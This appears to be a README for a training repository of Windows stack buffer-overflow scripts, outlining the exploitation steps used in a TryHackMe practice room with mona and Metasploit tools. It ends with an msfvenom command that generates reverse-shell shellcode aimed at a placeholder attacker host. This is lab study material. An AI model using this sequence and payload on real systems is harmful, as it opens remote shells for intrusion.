# Windows Buffer-Overflow-scripts
Scripts are used for BOF exploit

**Steps:**
1. Fuzzy
2. Detect offset
  * /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length of shellcode>
  * !mona findmsp
3. Control EIP
4. Find bad characters
  * !mona bytearray -b '\x00'
  * !mona cmp -a esp -f <path of bin file>
  * !mona bytearray -b 'bad chars'
5. JMP ESP
  * !mona jmp -r esp -cpb 'bad chars'
6. Exploit
  * msfvenom -p windows/shell_reverse_tcp lhost=<IP of Attacker> lport=<Listening port in Attacker machine> exitfunc=thread -b '<bad chars>' -f python --var-name <name of shellcode in your script> 

#### no73s.ctb have mentioned these steps through example of oscp.exe from TryHackMe room (https://tryhackme.com/room/bufferoverflowprep)
